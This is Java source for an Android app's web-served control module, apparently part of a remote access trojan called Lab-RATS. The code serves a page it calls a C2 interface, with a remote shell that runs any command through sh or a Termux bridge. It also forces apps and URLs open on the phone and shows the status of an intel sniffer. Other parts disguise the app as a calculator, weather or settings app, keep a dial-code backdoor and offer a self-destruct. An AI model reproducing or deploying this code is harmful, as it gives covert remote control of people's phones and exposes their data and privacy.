package com.labs.labrats.modules;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.labs.labrats.Constants;
import com.labs.labrats.FirebaseConfig;
import com.labs.labrats.LabRatsWorker;
import com.labs.labrats.MainActivity;
import com.labs.labrats.StatusNotification;
import com.labs.labrats.SystemAnalytics;
import com.labs.labrats.WorkManager_Sync;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import fi.iki.elonen.NanoHTTPD.IHTTPSession;
import fi.iki.elonen.NanoHTTPD.Response;

public class TerminalModule extends BaseModule {

    private static String currentShellPath = "/sdcard";

    public TerminalModule(Context context, FirebaseConfig server) {
        super(context, server);
    }

    public Response handleRequest(IHTTPSession session) {
        String uri = session.getUri();
        Map<String, String> params = session.getParms();

        if (uri.equals("/") || uri.isEmpty()) {
            return serveHome(session);
        } else if (uri.equals("/terminal/restart")) {
            return restartServer();
        } else if (uri.equals("/terminal/clear-logs")) {
            return clearLogs();
        } else if (uri.equals("/terminal/logs")) {
            return serveLogs(params);
        } else if (uri.equals("/device/shell")) {
            return handleShell(params);
        }
        return null;
    }

    private Response serveHome(IHTTPSession session) {
        WorkManager_Sync.notifyOperatorActivity();
        String ip = MainActivity.getLocalIpAddress();
        String ipDisplay = (ip != null ? ip : "NOT_DETECTED");
        String sessionId = FirebaseConfig.getSessionId();

        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        
        // Status Monitor Card
        html.append("<div class=\"card\">");
        String snifferStatus = StatusNotification.isServiceRunning() ? 
            "<span style=\"color:var(--neon-green); font-size:0.65rem; vertical-align:middle;\">INTEL_ACTIVE</span>" : 
            "<span style=\"color:var(--danger); font-size:0.65rem; vertical-align:middle;\">INTEL_OFFLINE</span>";
        html.append("<h2 style=\"margin:0; letter-spacing:1px; line-height:1.2; text-align: left; font-size: 1.6rem;\">SYSTEM_MONITOR ").append(snifferStatus).append("</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");

        html.append("<div style=\"margin-top: 15px;\">");
        html.append("<div style=\"font-size:0.6rem; opacity:0.5; font-family:monospace; margin-bottom:15px; text-align: left;\">SESSION_ID: ").append(sessionId).append("</div>");
        
        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; justify-content: center;\">");
        
        // Server Status
        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">UPLINK_STATUS</div>");
        html.append("<div style=\"font-size: 1.6rem; font-weight: bold; color: var(--neon-green); margin-top: 10px;\">ONLINE</div>");
        html.append("</div>");
        
        // Port
        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">ACCESS_PORT</div>");
        html.append("<div style=\"font-size: 1.6rem; font-weight: bold; color: var(--neon-cyan); margin-top: 10px;\">").append(server.getListeningPort()).append("</div>");
        html.append("</div>");
        
        // IP
        html.append("<div style=\"padding: 30px 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); text-align: center;\">");
        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">VIRTUAL_ADDRESS</div>");
        html.append("<div style=\"font-size: 1.2rem; font-weight: bold; color: var(--neon-cyan); word-break: break-all; margin-top: 10px;\">").append(ipDisplay).append("</div>");
        html.append("</div>");

        // NAT Traversal Info
        html.append("<div style=\"padding: 20px; background: rgba(255, 255, 0, 0.03); border: 1px solid var(--neon-yellow); border-radius: 15px; grid-column: 1 / -1; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3);\">");
        html.append("<div class=\"info-label\" style=\"color: var(--neon-yellow); font-size: 0.7rem;\">CONNECTIVITY_PROTOCOL</div>");
        html.append("<div style=\"font-size: 0.75rem; color: #aaa; margin-top: 8px; max-width: 800px; margin-left: auto; margin-right: auto;\">System prioritizes <b>Global IPv6</b> for remote access. Local IPs (192.168...) only work if you are on the <b>same WiFi</b>; otherwise, the device must use Cellular data for a public uplink.</div>");
        html.append("</div>");
        
        html.append("</div>");
        html.append("</div>");
        html.append("</div>"); // Close Status Monitor card

        // Section Separator (Tactical Divider)
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 35px 0;\"></div>");

        boolean termuxInstalled = isAppInstalled("com.termux");
        String promptSymbol = termuxInstalled ? "$" : "#";

        // --- SYSTEM ACTIVITY LOGS SECTION ---
        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-yellow);\">");
        html.append("<h2 style=\"color: var(--neon-yellow); text-align: left; margin-bottom: 25px; font-size: 1.15rem;\">SYSTEM_ACTIVITY_LOGS <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_ACTIVITY_LOGS', 'Real-time telemetry stream of background events and captured device actions.')\">INFO</span></h2>");
        html.append("<div id=\"log-terminal\" class=\"terminal-text\" style=\"height: 250px; overflow-y: auto; font-size: 0.7rem;\">");
        html.append("[LOADING_SYSTEM_LOGS...] Waiting for telemetry handshake...");
        html.append("</div>");
        html.append("<div style=\"margin-top: 15px; text-align: center;\">");
        html.append("<button onclick=\"clearSessionLogs()\" class=\"btn btn-small\" style=\"border-color: #333; color: #888;\">PURGE_SESSION_LOGS</button>");
        html.append("</div>");
        html.append("</div>");

        // --- REMOTE SHELL TERMINAL SECTION ---
        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-cyan);\">");
        html.append("<h2 style=\"color: var(--neon-cyan); text-align: left; margin-bottom: 25px; font-size: 1.05rem; letter-spacing: 1.5px;\">REMOTE_SHELL_TERMINAL <span class=\"info-trigger\" onclick=\"showInfo(event, 'REMOTE_SHELL_TERMINAL', 'Interactive command-line interface for direct system execution.')\">INFO</span></h2>");
        html.append("<div style=\"background: #000; border-radius: 12px; border: 1px solid rgba(0, 242, 255, 0.2); overflow: hidden;\">");
        html.append("<div id=\"shell-output\" style=\"padding: 20px; font-size: 0.75rem; color: var(--terminal-green); line-height: 1.6; font-family: 'JetBrains Mono', monospace; height: 250px; overflow-y: auto;\">");
        html.append("<div>[STABILITY_OS] Initializing remote session...</div>");
        html.append("<div>[UPLINK] Connected to /dev/pts/0</div>");
        html.append("<div id=\"termux-uplink\" style=\"color: var(--neon-yellow); display: ").append(termuxInstalled ? "block" : "none").append(";\">[UPLINK] Termux bridge available.</div>");
        html.append("<div style=\"opacity: 0.5; margin-top: 5px;\">Type 'help' for command list</div>");
        html.append("</div>");
        html.append("<div style=\"border-top: 1px solid rgba(0, 242, 255, 0.1); padding: 10px; display: flex; align-items: center; background: rgba(0,0,0,0.5);\">");
        html.append("<span id=\"terminal-prompt\" style=\"color: var(--terminal-green); font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; margin-right: 10px; white-space: nowrap;\">root@Android:~").append(promptSymbol).append("</span>");
        html.append("<input id=\"shell-cmd\" type=\"text\" autocapitalize=\"none\" autocorrect=\"off\" autocomplete=\"off\" spellcheck=\"false\" placeholder=\"enter command...\" style=\"background: transparent; border: none; color: #fff; outline: none; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; flex-grow: 1; padding: 5px 0;\">");
        html.append("</div>");
        html.append("</div>");
        html.append("<div class=\"terminal-input-wrap\" style=\"margin-top: 15px; display: flex; justify-content: center; gap: 10px; flex-wrap: wrap;\">");
        html.append("<button onclick=\"executeShell()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); margin:0;\">EXECUTE</button>");
        html.append("<button onclick=\"document.getElementById('shell-output').innerHTML=''\" class=\"btn btn-small\" style=\"border-color: #333; color: #888; margin:0;\">CLEAR_SCREEN</button>");
        html.append("</div>");
        html.append("</div>");

        // --- DEVICE COMMANDS CARD ---
        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-green);\">");
        html.append("<h2 style=\"color: var(--neon-green); text-align: left; margin-bottom: 25px; font-size: 1.15rem;\">DEVICE_COMMANDS <span class=\"info-trigger\" onclick=\"showInfo(event, 'DEVICE_COMMANDS', 'Execute tactical system overrides and device interactions.')\">INFO</span></h2>");
        
        // 1. Device Sound Setting
        html.append("<div style=\"margin-bottom: 25px;\">");
        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-green); font-size: 0.7rem;\">DEVICE_SOUND_SETTING</div>");
        html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
        html.append("<select id=\"device-cmd-selector\" style=\"background: #000; border: 1px solid var(--neon-green); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
        html.append("<option value=\"vibrate\">VIBRATE_DEVICE</option>");
        html.append("<option value=\"max-volume\">MAXIMIZE_VOLUME</option>");
        html.append("<option value=\"silent-mode\">SILENT_MODE</option>");
        html.append("</select>");
        html.append("<button onclick=\"deviceCmd(document.getElementById('device-cmd-selector').value)\" class=\"btn\" style=\"border-color: var(--neon-green); color: var(--neon-green); background: rgba(57, 255, 20, 0.05); width: 210px !important; margin: 0;\">EXECUTE</button>");
        html.append("</div></div>");

        // 2. Force Open App
        html.append("<div style=\"margin-bottom: 25px;\">");
        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-cyan); font-size: 0.7rem;\">FORCE_OPEN_APP</div>");
        html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
        html.append("<select id=\"app-selector\" style=\"background: #000; border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
        html.append("<option value=\"\" style=\"background:#000;\">Select App...</option>");
        for (FirebaseConfig.AppEntry app : server.getLaunchableAppsProxy()) {
            html.append("<option value=\"").append(app.packageName).append("\">").append(escapeHtml(app.name)).append("</option>");
        }
        html.append("</select>");
        html.append("<button onclick=\"openApp()\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); width: 210px !important; margin: 0;\">OPEN_APP</button>");
        html.append("</div></div>");

        // 3. Force Open URL
        html.append("<div style=\"margin-bottom: 25px;\">");
        html.append("<div class=\"info-label\" style=\"text-align: left; color: var(--neon-cyan); font-size: 0.7rem;\">FORCE_OPEN_URL</div>");
        html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px;\">");
        html.append("<input id=\"target-url\" type=\"text\" placeholder=\"https://example.com\" style=\"background: #000; border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
        html.append("<button onclick=\"openUrl()\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); width: 210px !important; margin: 0;\">EXECUTE</button>");
        html.append("</div></div>");
        html.append("</div>"); // Close DEVICE_COMMANDS card
        
        // --- STEALTH OPERATIONS CARD ---
        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-orange);\">");
        html.append("<h2 style=\"color: var(--neon-orange); font-size: 1.15rem; text-align: left;\">STEALTH_OPERATIONS <span class=\"info-trigger\" onclick=\"showInfo(event, 'STEALTH_OPERATIONS', 'Advanced application camouflage. Choose an identity to masquerade as a functional decoy. Use dial pad code &lt;b&gt;*#1337#&lt;/b&gt; or the hidden backdoor to restore access.')\">INFO</span></h2>");
        
        html.append("<div style=\"margin-bottom: 15px; display: flex; flex-direction: column; align-items: flex-start;\">");
        html.append("<label class=\"info-label\" style=\"align-self: flex-start; font-size: 0.9rem;\">MASQUERADE_IDENTITY:</label>");
        html.append("<select id=\"stealth-type\" style=\"width:100%; max-width:450px; background:#000; border:1px solid var(--neon-orange); color:#fff; padding:10px; border-radius:8px; outline:none; font-family:monospace; margin-top:5px;\">");
        html.append("<option value=\"update\">System Update (Status Gear)</option>");
        html.append("<option value=\"calc\">Calculator (Apple Style)</option>");
        html.append("<option value=\"weather\">Weather (Blue Sky Forecast)</option>");
        html.append("<option value=\"settings\">Settings (System Config)</option>");
        html.append("<option value=\"logo\">Lab-RATS Logo (Unmasked)</option>");
        html.append("</select>");
        html.append("</div>");

        html.append("<div class=\"btn-container\" style=\"display:flex; flex-direction:column; gap:10px; align-items: flex-start;\">");
        html.append("<button onclick=\"toggleStealth()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255, 157, 0, 0.05); border-radius:12px; padding: 10px 25px;\">INITIATE_STEALTH</button>");
        html.append("<button onclick=\"restoreNormal()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); border-radius:12px; padding: 10px 25px;\">RESTORE_NORMAL</button>");
        html.append("</div>");
        html.append("</div>");

        // --- CHANGE ACCESS KEY SECTION ---
        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-cyan);\">");
        html.append("<h2 style=\"color: var(--neon-cyan); text-align: left; margin-bottom: 25px; font-size: 1.15rem;\">SECURITY_PROTOCOL <span class=\"info-trigger\" onclick=\"showInfo(event, 'SECURITY_PROTOCOL', 'Update login password for the remote C2 interface.')\">INFO</span></h2>");
        html.append("<div style=\"display: flex; flex-direction: column; align-items: flex-start;\">");
        html.append("<div style=\"width: 100%; max-width: 660px;\">");
        html.append("<form action=\"/settings/password\" method=\"POST\" class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 10px;\">");
        html.append("<input name=\"new_password\" type=\"password\" placeholder=\"ENTER_NEW_KEY\" style=\"background: #000; border: 1px solid var(--neon-cyan); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
        html.append("<button type=\"submit\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); padding: 10px; font-size: 0.7rem; width: 210px !important; text-align: center; margin: 0;\">UPDATE_KEY</button>");
        html.append("</form></div></div></div>");

        // --- DANGER ZONE SECTION ---
        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--danger);\">");
        html.append("<h2 style=\"color: var(--danger); text-align: left; margin-bottom: 25px; font-size: 1.15rem;\">DANGER_ZONE <span class=\"info-trigger\" onclick=\"showInfo(event, 'DANGER_ZONE', 'Critical system overrides for service termination and data sanitization.')\">INFO</span></h2>");
        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px;\">");
        html.append("<button onclick=\"deviceCmd('terminate')\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); margin:0;\">&#128683; TERMINATE_UPLINK</button>");
        html.append("<button onclick=\"restartServer()\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); margin:0;\">&#128260; RESTART_SERVER</button>");
        html.append("<button onclick=\"selfDestruct()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.1); margin:0;\">&#9763; SELF_DESTRUCT</button>");
        html.append("</div></div>");

        html.append(getFooter());
        return server.serveGzippedProxy(session, "text/html", html.toString());
    }

    private Response restartServer() {
        FirebaseConfig.logActivity("SECURITY_MAINTENANCE: Initiating remote service restart...");
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            Intent intent = new Intent(context, WorkManager_Sync.class);
            intent.setAction(Constants.ACTION_STOP_CORE);
            context.startService(intent);
        }, 1500);
        return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
    }

    private Response clearLogs() {
        FirebaseConfig.clearSystemLogs();
        FirebaseConfig.logActivity("SYSTEM_MAINTENANCE: Session logs cleared");
        return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
    }

    private Response serveLogs(Map<String, String> params) {
        int since = 0;
        try {
            if (params.containsKey("since")) since = Integer.parseInt(params.get("since"));
        } catch (Exception ignored) {}
        
        return newResponse(Response.Status.OK, "application/json", FirebaseConfig.getLogsJson(since));
    }

    private Response handleShell(Map<String, String> params) {
        String cmd = params.get("cmd");
        boolean termuxAvailable = isAppInstalled("com.termux");
        String shellResult = executeShell(cmd);
        
        try {
            org.json.JSONObject resultObj = new org.json.JSONObject();
            resultObj.put("output", shellResult);
            resultObj.put("termux_available", termuxAvailable);
            return newResponse(Response.Status.OK, "application/json", resultObj.toString());
        } catch (Exception e) {
            return newResponse(Response.Status.OK, "application/json", "{\"output\": \"JSON Error\", \"termux_available\": false}");
        }
    }

    private boolean isAppInstalled(String packageName) {
        try {
            context.getPackageManager().getPackageInfo(packageName, 0);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private String executeShell(String command) {
        if (command == null || command.isEmpty()) return "";
        try {
            if (command.equalsIgnoreCase("help") || command.equalsIgnoreCase("-h")) {
                return "AVAILABLE_COMMANDS:\n\n" +
                       "  cd <path>        - Change working directory\n" +
                       "  ls [-la]         - List files in current directory\n" +
                       "  pwd              - Print current directory\n" +
                       "  cat <file>       - View file contents\n" +
                       "  rm <file>        - Remove file\n" +
                       "  mkdir <dir>      - Create directory\n" +
                       "  pm list packages - List installed app packages\n" +
                       "  getprop          - View system properties\n" +
                       "  df -h            - Disk usage summary\n" +
                       "  top -n 1         - Process list\n" +
                       "  netstat          - Network status\n" +
                       "  ip addr          - IP configuration\n" +
                       "  uptime           - System uptime\n" +
                       "  whoami           - Current user identity\n" +
                       "  id               - UID/GID info\n" +
                       "  uname -a         - Kernel version/info\n" +
                       "  logcat -d        - Dump system logs\n" +
                       "  sysinfo          - Aggregate system overview\n" +
                       "  termux <cmd>     - Route command through Termux bridge\n" +
                       "  termux-fix-mirrors - Fix 'No mirror selected' errors\n" +
                       "  help / -h        - Show this help menu\n\n" +
                       "CURRENT_PATH: " + currentShellPath;
            }

            if (command.equalsIgnoreCase("sysinfo")) {
                return "SYSTEM_OVERVIEW:\n" +
                       "  Manufacturer: " + android.os.Build.MANUFACTURER + "\n" +
                       "  Model: " + android.os.Build.MODEL + "\n" +
                       "  Android Ver: " + android.os.Build.VERSION.RELEASE + " (API " + android.os.Build.VERSION.SDK_INT + ")\n" +
                       "  C2 Uplink: " + currentShellPath + "\n" +
                       "  Session User: " + System.getProperty("user.name") + "\n" +
                       "  Architecture: " + System.getProperty("os.arch");
            }

            if (command.trim().equalsIgnoreCase("termux-fix-mirrors")) {
                return executeShell("termux echo \"deb https://packages-cf.termux.dev/apt/termux-main stable main\" > /data/data/com.termux/files/usr/etc/apt/sources.list && apt update");
            }

            if (command.startsWith("termux ") || 
               (isAppInstalled("com.termux") && (command.startsWith("pkg ") || command.startsWith("apt ") || command.startsWith("pip ") || command.startsWith("python ") || command.startsWith("nmap ") || command.startsWith("echo ")))) {
                
                if (!isAppInstalled("com.termux")) return "Error: Termux is not installed on this device.";
                
                String termuxCmd = command;
                if (command.startsWith("termux ")) termuxCmd = command.substring(7).trim();

                String cmdId = String.valueOf(System.currentTimeMillis() % 1000000);
                File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                File outputFile = new File(downloadDir, "termux_" + cmdId + ".txt");

                Intent intent = new Intent("com.termux.RUN_COMMAND");
                intent.setClassName("com.termux", "com.termux.app.RunCommandService");
                intent.putExtra("com.termux.RUN_COMMAND_PATH", "/data/data/com.termux/files/usr/bin/bash");
                
                String wrappedCmd = "export PATH=/data/data/com.termux/files/usr/bin:$PATH; " +
                                  "export HOME=/data/data/com.termux/files/home; " +
                                  "export DEBIAN_FRONTEND=noninteractive; " +
                                  "({ " + termuxCmd + "; }) > " + outputFile.getAbsolutePath() + " 2>&1; " +
                                  "echo \"\n__DONE_" + cmdId + "__\" >> " + outputFile.getAbsolutePath();
                
                intent.putExtra("com.termux.RUN_COMMAND_ARGUMENTS", new String[]{"-c", wrappedCmd});
                intent.putExtra("com.termux.RUN_COMMAND_WORKDIR", "/data/data/com.termux/files/home");
                intent.putExtra("com.termux.RUN_COMMAND_BACKGROUND", true);
                intent.addFlags(Intent.FLAG_RECEIVER_FOREGROUND);
                
                try {
                    context.startService(intent);
                } catch (Exception e) {
                    return "Error starting bridge: " + e.getMessage();
                }

                final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
                String marker = "__DONE_" + cmdId + "__";
                
                LabRatsWorker.execute(() -> {
                    int retries = 0;
                    int maxRetries = (command.contains("pkg") || command.contains("apt") || command.contains("pip")) ? 300 : 60; 
                    while (retries < maxRetries) {
                        try { Thread.sleep(1000); } catch (Exception ignored) {}
                        if (outputFile.exists() && outputFile.length() > 0) {
                            try (java.io.RandomAccessFile raf = new java.io.RandomAccessFile(outputFile, "r")) {
                                long len = raf.length();
                                if (len > 30) {
                                    raf.seek(len - 30);
                                    byte[] endBytes = new byte[30];
                                    raf.read(endBytes);
                                    if (new String(endBytes).contains(marker)) {
                                        latch.countDown();
                                        return;
                                    }
                                }
                            } catch (Exception ignored) {}
                        }
                        retries++;
                    }
                    latch.countDown();
                });

                try {
                    latch.await();
                } catch (InterruptedException ignored) {}

                if (outputFile.exists() && outputFile.length() > 0) {
                    try { Thread.sleep(500); } catch (Exception ignored) {}
                    
                    for (int r = 0; r < 5; r++) {
                        try {
                            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                            try (java.io.FileInputStream fis = new java.io.FileInputStream(outputFile)) {
                                byte[] buffer_chunk = new byte[8192];
                                int len_read;
                                while ((len_read = fis.read(buffer_chunk)) != -1) {
                                    baos.write(buffer_chunk, 0, len_read);
                                }
                            }
                            
                            String result = baos.toString("UTF-8");
                            if (result.contains(marker)) {
                                result = result.replace(marker, "").trim();
                                try { outputFile.delete(); } catch (Exception ignored) {}
                                return result + "\n\n[Termux Bridge Execution Complete]";
                            }
                            
                            if (r == 4) return result + "\n\n[Warning: Completion marker not detected, output might be partial]";
                        } catch (Exception e) {
                            try { Thread.sleep(1000); } catch (Exception ignored) {}
                        }
                    }
                } else {
                    return "Command timed out.\n" +
                           "Note: Larger installs like 'nmap' or 'python' can take 1-2 minutes.";
                }
            }

            if (command.startsWith("cd ")) {
                String targetPath = command.substring(3).trim();
                File nextDir;
                if (targetPath.startsWith("/")) nextDir = new File(targetPath);
                else nextDir = new File(currentShellPath, targetPath);
                
                if (nextDir.exists() && nextDir.isDirectory()) {
                    currentShellPath = nextDir.getCanonicalPath();
                    return "Directory changed to: " + currentShellPath;
                } else {
                    return "Error: Directory does not exist";
                }
            }

            ProcessBuilder pb = new ProcessBuilder("sh", "-c", command);
            pb.directory(new File(currentShellPath));
            pb.redirectErrorStream(true);
            
            Process process = pb.start();
            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            int count = 0;
            while ((line = reader.readLine()) != null && count < 100) {
                output.append(line).append("\n");
                count++;
            }
            if (output.length() == 0) output.append("[Command executed with no output]");

            FirebaseConfig.logActivity("DEVICE_CONTROL: Shell command executed - " + command);
            return output.toString();
        } catch (Exception e) {
            return "Shell Error: " + e.getMessage();
        }
    }
}
